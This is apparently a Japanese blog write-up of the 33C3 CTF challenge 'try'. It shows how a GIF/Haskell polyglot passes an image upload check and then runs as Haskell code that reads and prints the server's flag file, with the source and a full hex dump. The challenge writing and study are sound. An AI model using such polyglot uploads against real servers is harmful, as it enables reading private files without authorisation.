---
layout: post
redirect_from:
  - /writeup/ctf/2016/33c3-ctf-try/
  - /blog/2016/12/30/33c3-ctf-try/
date: "2016-12-30T13:39:37+09:00"
tags: [ "ctf", "writeup", "web", "33c3-ctf", "polyglot", "haskell" ]
---

# 33C3 CTF: try

<!-- {% raw %} -->

## problem

<https://tryhaskell.org/>に似たページ。ただし`Upload not implemented yet!`なので、鯖上に元々置いてあるファイルを選んで実行するしかできない。

![](/blog/2016/12/30/33c3-ctf-try/1.png)

[/profile](http://78.46.224.73/profile)から画像をuploadできる。
ただし有効なgif画像でないと`Something went wrong! Maybe not a GIF?`と言われる。ここでいう有効とは`file`して`GIF image data`になるだけではだめで、ちゃんと表示できるようなやつ。

![](/blog/2016/12/30/33c3-ctf-try/2.png)

## solution

Haskellとのpolyglot GIF画像を作る。

検索するとjavascriptとのpolyglotがでてくる([ThinkFu &rsaquo; GIF/Javascript Polyglots](http://www.thinkfu.com/blog/gifjavascript-polyglots))ので、これを修正して以下のようにする。

``` haskell
GIF89a{-

*GIF DATA*

-}=GIF89a
data GIF89a = GIF89a
main = putStr =<< readFile "/challenge/flag"
{-

*GIF DATA*

-} --
```

注意として、non-asciiはコメントアウトしないとだめ。以下のように、文字列に入れると怒られる。

``` haskell
GIF89a="                         *GIF DATA*                          " `f` GIF89a where f a b = b
data GIF89a = GIF89a
main = putStr =<< readFile "/challenge/flag"
```

``` sh
/challenge/static/33c3_b2939f4b-c043-477e-bf02-b0257f1d2f1e/pic.gif:1:11:
    lexical error in string/character literal (UTF-8 decoding error)
```

flag: `33C3_n3xt_T1me_idri5_m4ybe`

## 結果

![](/blog/2016/12/30/33c3-ctf-try/polyglot.hs.gif)

```
$ xxd polyglot.hs.gif
00000000: 4749 4638 3961 7b2d 2720 a524 0000 0000  GIF89a{-' .$....
00000010: 2800 0059 0000 6464 6480 8080 8e8e 8e96  (..Y..ddd.......
00000020: 9696 9999 99aa 0000 aaaa aabc 0000 bfbf  ................
00000030: bfc6 0000 cbcb cbcc 0000 d400 00db 0000  ................
00000040: db31 31de dede df3f 3fe2 5151 e35b 5be6  .11....??.QQ.[[.
00000050: 6a6a e7e7 e7e8 7b7b eb87 87eb 8a8a ed94  jj....{{........
00000060: 94f1 abab f2b1 b1f4 bebe f4c3 c3f7 cdcd  ................
00000070: f9dc dcfa e1e1 fdfd fdff ffff ffff ffff  ................
00000080: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000090: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000c0: ffff ffff ffff ffff ffff ffff ff21 fe27  .............!.'
000000d0: 3b64 6f63 756d 656e 742e 6765 7445 6c65  ;document.getEle
000000e0: 6d65 6e74 4279 4964 2822 6a73 6f75 7470  mentById("jsoutp
000000f0: 7574 2229 2e69 6e6e 6572 4854 4d4c 203d  ut").innerHTML =
00000100: 2022 5468 696e 6b46 2d7d 203d 4749 4638   "ThinkF-} =GIF8
00000110: 3961 0a64 6174 6120 4749 4638 3961 203d  9a.data GIF89a =
00000120: 2047 4946 3839 610a 6d61 696e 203d 2070   GIF89a.main = p
00000130: 7574 5374 7220 3d3c 3c20 7265 6164 4669  utStr =<< readFi
00000140: 6c65 2022 2f63 6861 6c6c 656e 6765 2f66  le "/challenge/f
00000150: 6c61 6722 0a7b 2d20 2020 2020 2020 2020  lag".{-         
00000160: 2020 2020 2020 0420 2020 2000 2c00 0000        .    .,...
00000170: 008f 0058 0000 06fe c091 7048 2c1a 8fc8  ...X......pH,...
00000180: a472 c96c 3a9f c687 740a ad5a afd8 ac56  .r.l:...t..Z...V
00000190: 38ed 4ab7 e0b0 788c f47a c9e8 b4da 6936  8.J...x..z....i6
000001a0: afdf 7075 db1d afdb b3f3 ee7d cf6f e6f5  ..pu.......}.o..
000001b0: 7d81 8243 5423 6d83 887d 805c 8589 8e75  }..CT#m..}.\...u
000001c0: 8d8f 927b 8b93 9671 9597 9a69 999b 9e60  ...{...q...i...`
000001d0: 679f a2a0 9da3 a64f a5a7 aa4a a1ab ae4b  g......O...J...K
000001e0: adaf b251 a9b3 afb1 b6b3 74b9 b6bb bcb2  ...Q......t.....
000001f0: bebf aeb8 c2aa c1c5 a7c7 c8a3 cacb 9fcd  ................
00000200: ce9b d050 00d5 d6d7 d8d8 46d6 5a22 151d  ...P......F.Z"..
00000210: 206b dc58 875b d9e7 e800 44da 5713 11ef   k.X.[....D.W...
00000220: 1118 69ec 56e5 59e9 f8ec e756 1815 fefe  ..i.V.Y....V....
00000230: 1444 90d9 578f 9895 7c08 d58d 20f8 a481  .D..W...|... ...
00000240: 850c 1023 7218 98ed ca34 2709 f309 61e8  ...#r....4'...a.
00000250: 6481 860e 2043 7aa0 480f d5c5 2619 d30d  d... Cz.H...&...
00000260: e1d8 e4c2 c410 3045 8423 79ad a0c1 8329  ......0E.#y....)
00000270: 4bb2 74b2 6148 fe88 0e68 7632 b117 b4a2  K.t.aH...hv2....
00000280: 1296 d59a 7c10 22f0 88c2 6d4f 9108 dd58  ....|."...mO...X
00000290: e624 96a9 2b2b aabc 420f 9d54 a345 4a32  .$..++..B..T.EJ2
000002a0: aa05 06eb c69c 49a1 8ecb 5a13 a1da 9a61  ......I...Z....a
000002b0: c11a b27a 55ae 53b4 69d7 e9c4 1b75 a15d  ...zU.S.i....u.]
000002c0: af84 e872 b5fb 16ad debd 7c0f c33d cbf1  ...r......|..=..
000002d0: 0fd1 b191 ee8a 2d9c 53f1 5abf 89d9 2ec6  ......-.S.Z.....
000002e0: 47c4 31b1 c794 fb86 ce68 392f e6cc a7c7  G.1......h9/....
000002f0: 710e ec39 f2dc 9b9a 2f4b 06bb 3ab5 e9d5  q..9..../K..:...
00000300: b5f7 d586 5c68 0e2d d88c 177f 250c d876  ....\h.-....%..v
00000310: d4e2 b1d7 1a2e 520e b4ef a384 e34e 36fe  ......R......N6.
00000320: 94a3 d0e2 957f 0372 7ed2 acf1 d99b e55e  .......r~......^
00000330: 6798 b26a 28ee c083 cb0e 0d5e b9f8 e8d8  g..j(......^....
00000340: 139a dffe f839 f4e9 a545 534f 7e1c 3e79  .....9...ESO~.>y
00000350: d2da f576 0c68 ede9 975f 81d5 bd37 5d7c  ...v.h..._...7]|
00000360: f205 f8c5 6b9d 10c8 de7d c2f1 9720 6215  ....k....}... b.
00000370: aae7 1e80 9dfe b961 1f6f ae15 b8c4 78b4  .......a.o....x.
00000380: 2998 e17e 1aaa b315 6b7a a047 d681 14ae  )..~....kz.G....
00000390: 87e2 77fc 2158 2375 51d1 519f 8413 2641  ..w.!X#uQ.Q...&A
000003a0: 6257 26ca c820 5cab 35e7 4b1e 81f9 181d  bW&.. \.5.K.....
000003b0: 8cd2 0189 a190 ff39 69d4 211f 22f9 9a92  .......9i.!."...
000003c0: f8dd d864 784f 9a66 a196 3842 4805 5156  ...dxO.f..8BH.QV
000003d0: 8608 a688 a381 f923 9715 a6a3 e39b 4892  .......#......H.
000003e0: e5dd 9a1b 0a47 675e 48a1 0367 9c7f 8cb8  .....Gg^H..g....
000003f0: e499 295e 68a7 7f25 4e76 4e00 bbf4 2966  ..)^h..%NvN...)f
00000400: 7a34 6279 a26d 4c36 ba65 7f0b 6223 40a2  z4by.mL6.e..b#@.
00000410: f659 c944 9696 39ea a5a1 8f42 dae9 70d5  .Y.D..9....B..p.
00000420: 2870 e467 8c4a f784 8c71 2939 dca6 06b2  (p.g.J...q)9....
00000430: aad7 a2d1 18d3 ca01 070c 81eb 08b8 f6ba  ................
00000440: ebaf b9d6 8ac9 adbc 16ab ab10 bf1e 1bac  ................
00000450: b06b ecd2 2baf bb1a 0b6c aecf 32db 6c25  .k..+....l..2.l%
00000460: d446 8b2c b2d4 2a6b ad1c b13c 5b6d b0d3  .F.,..*k...<[m..
00000470: 4afb 2d1a 5282 9dcb 47ba eade 916a bb8a  J.-.R...G....j..
00000480: bc08 6f20 efce ebae bcf6 5262 66be 82e0  ..o ......Rbf...
00000490: cbaf 1dfe fe0b 47c0 02bf 4170 c1e0 3e80  ......G...Ap..>.
000004a0: f0bd 91ec bbf0 1846 3ef8 f0b5 8e4d 3cb0  .......F>....M<.
000004b0: 6716 1b5c 71c6 147f c831 ba9a 7e9c 70bd  g..\q....1..~.p.
000004c0: 2293 7370 1841 0000 21fe 2a2f 202f 2f20  ".sp.A..!.*/ // 
000004d0: 2020 2020 2020 2020 202d 7d20 2d2d 2020           -} --  
000004e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
000004f0: 2020 2020 2004 2020 2020 003b                 .    .;
```

<!-- {% endraw %} -->
